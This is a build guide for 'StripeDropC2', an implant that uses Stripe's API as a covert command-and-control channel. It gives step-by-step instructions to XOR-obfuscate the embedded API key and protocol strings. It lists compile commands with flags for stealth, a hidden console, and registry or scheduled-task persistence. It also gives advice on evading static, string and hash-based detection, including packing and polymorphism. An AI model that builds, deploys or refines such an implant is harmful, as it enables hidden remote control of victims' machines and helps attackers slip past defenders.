# Encryption & Build Workflow

**CRITICAL**: You must follow this workflow every time you build the implant to ensure your Stripe API key is properly encrypted and your C2 is functional.

## Why This Matters

StripeDropC2 uses XOR encryption to obfuscate sensitive strings (including your Stripe API key) in the compiled binary. This prevents:
- Static analysis tools from extracting your API key
- Simple `strings` command from revealing sensitive data
- Signature-based detection (key changes on every build)

## Complete Build Workflow

### Step 1: Edit regenerate_key.py

Open `regenerate_key.py` and find this section (around line 29):

```python
# ============================================================
# *** IMPORTANT: CHANGE THIS TO YOUR STRIPE TEST API KEY ***
# Get your key from: https://dashboard.stripe.com/test/apikeys
# This should be a TEST mode key: sk_test_...
# NEVER use a live mode key (sk_live_...) for C2 operations!
# ============================================================
YOUR_STRIPE_API_KEY = "sk_test_YOUR_STRIPE_TEST_KEY_HERE"
```

**Replace the placeholder with YOUR actual Stripe test API key:**

```python
YOUR_STRIPE_API_KEY = "sk_test_51ABCxyz123..." # ← Your real key here
```

### Step 2: Run regenerate_key.py

This script will:
1. Generate a new random 16-byte XOR key
2. Encrypt your Stripe API key with this key
3. Encrypt all protocol strings (heartbeat, c2-pending, etc.)
4. Update Implant.cs with the encrypted byte arrays

```bash
python3 regenerate_key.py
```

**Expected output:**
```
[*] Generated new XOR key: 0xA3, 0xB2, 0xC1, ...
[+] Regenerated encryption for 18 strings
[+] Implant.cs updated successfully

Now rebuild with:
dotnet publish Implant.csproj -c Release -r win-x64 -p:DefineConstants=HIDE_CONSOLE
```

### Step 3: Build the Implant

Now compile with your preferred stealth profile:

**Balanced (recommended):**
```bash
dotnet publish Implant.csproj -c Release -r win-x64 \
-p:DefineConstants="STEALTH_BALANCED;HIDE_CONSOLE;PERSIST_REGISTRY;ALLOW_DYNAMIC_CONFIG"
```

**High Stealth:**
```bash
dotnet publish Implant.csproj -c Release -r win-x64 \
-p:DefineConstants="STEALTH_HIGH;HIDE_CONSOLE;PERSIST_TASK;ALLOW_DYNAMIC_CONFIG"
```

**Maximum Stealth:**
```bash
dotnet publish Implant.csproj -c Release -r win-x64 \
-p:DefineConstants="STEALTH_PARANOID;HIDE_CONSOLE;PERSIST_REGISTRY;PERSIST_TASK;ALLOW_DYNAMIC_CONFIG"
```

### Step 4: Verify Build

Check that the binary was created:
```bash
ls -lh bin/Release/net10.0/win-x64/publish/stripe.exe
```

Expected size: ~15-25 MB (self-contained, trimmed)

## When to Regenerate

**You MUST regenerate the key before:**
- Your very first build
- Every new operation/engagement
- After changing your API key
- When creating builds for different organizations

**Why regenerate frequently?**
- Changes binary signature (defeats hash-based detection)
- Ensures fresh encryption key per deployment
- Prevents key reuse if one binary is compromised

## Common Mistakes

### Mistake 1: Building Without Running regenerate_key.py

**Problem:**
```bash
# DON'T DO THIS
dotnet publish Implant.csproj -c Release ...
# Without running regenerate_key.py first
```

**Result:** Implant will have placeholder/dummy encrypted strings and won't work!

**Solution:** Always run `python3 regenerate_key.py` before building.

### Mistake 2: Forgetting to Update API Key in regenerate_key.py

**Problem:** You run `regenerate_key.py` but forgot to change the placeholder key.

**Result:** Implant is compiled with dummy key `sk_test_YOUR_STRIPE_TEST_KEY_HERE` and won't connect!

**Solution:** Edit line 29 of `regenerate_key.py` first, THEN run it.

### Mistake 3: Using Different API Keys in Operator vs Implant

**Problem:** 
- Operator uses key from `c2_config.py`
- Implant uses key encrypted in `regenerate_key.py`
- These keys are different!

**Result:** Implant and operator can't communicate (different Stripe accounts).

**Solution:** Make sure BOTH files have the SAME Stripe test API key.

### Mistake 4: Committing Your API Key to Git

**Problem:** You accidentally committed `regenerate_key.py` with your real API key.

**Result:** Your API key is now public on GitHub!

**Solution:**
1. Immediately revoke the key in Stripe dashboard
2. Generate a new key
3. Update both `c2_config.py` and `regenerate_key.py`
4. Add to `.gitignore` if not already there

## How the Encryption Works

### The Crypto Class (in Implant.cs)

```csharp
static class Crypto
{
// Random key generated by regenerate_key.py
private static readonly byte[] Key = new byte[] 
{ 
0xA3, 0xB2, 0xC1, ... // 16 random bytes
};

public static string Decrypt(byte[] encrypted)
{
// XOR decryption at runtime
var decrypted = new byte[encrypted.Length];
for (int i = 0; i < encrypted.Length; i++)
decrypted[i] = (byte)(encrypted[i] ^ Key[i % Key.Length]);
return Encoding.UTF8.GetString(decrypted);
}
}
```

### The Encrypted Strings (in Implant.cs)

```csharp
static class EncryptedStrings
{
// Your API key encrypted as byte array
static readonly byte[] ENC_API_KEY = new byte[] { 0xDE, 0x8E, ... };
public static string API_KEY => Crypto.Decrypt(ENC_API_KEY);

// Protocol strings also encrypted
static readonly byte[] ENC_HEARTBEAT = new byte[] { 0xC5, 0x80, ... };
public static string S_HEARTBEAT => Crypto.Decrypt(ENC_HEARTBEAT);

// ... etc for all strings
}
```

### At Runtime

1. Implant starts
2. Needs to make Stripe API call
3. Calls `EncryptedStrings.API_KEY`
4. This triggers `Crypto.Decrypt(ENC_API_KEY)`
5. XOR decryption happens in memory
6. Plaintext key is used for API call
7. Key is never stored in plaintext in binary

## Security Considerations

### Why XOR?

**Pros:**
- Fast (single XOR operation)
- Changes binary signature on every build
- No crypto library dependencies
- Defeats basic static analysis

**Cons:**
- Not cryptographically secure
- Key is embedded in binary (can be found with analysis)
- Single byte XOR is weak encryption

**Purpose:**
XOR obfuscation is **defense-in-depth**, not strong cryptography. It raises the bar for static analysis but won't stop a determined reverse engineer. The real value is:
1. Prevents casual string extraction
2. Forces dynamic analysis (must run to decrypt)
3. Unique signature per build (defeats hash-based detection)

### Improving Security

**For production operations:**
1. Regenerate key before EVERY deployment
2. Use different Stripe accounts per engagement
3. Consider additional obfuscation (packing, polymorphism)
4. Rotate API keys frequently
5. Monitor Stripe dashboard for unauthorized activity

## Troubleshooting

### "ModuleNotFoundError: No module named 're'"

**Problem:** Python can't find the `re` (regex) module.

**Solution:** This is a built-in module - your Python installation may be broken. Reinstall Python 3.8+.

### "FileNotFoundError: [Errno 2] No such file or directory: 'Implant.cs'"

**Problem:** You're not in the repository root directory.

**Solution:** Run `cd /path/to/StripeDropC2` and try again.

### Implant Doesn't Connect After Build

**Problem:** Implant compiles but never shows up in `implants` command.

**Checklist:**
1. Did you run `regenerate_key.py` before building? 
2. Is the API key in `regenerate_key.py` the same as `c2_config.py`?
3. Is the key a valid Stripe TEST mode key (starts with `sk_test_`)?
4. Does the target have internet access to api.stripe.com?
5. Is there a firewall blocking HTTPS outbound?

### "Authentication Error" When Implant Runs

**Problem:** Stripe API returns authentication error.

**Solution:**
- API key is invalid or revoked
- Regenerate key in Stripe dashboard
- Update both `regenerate_key.py` and `c2_config.py`
- Rebuild implant
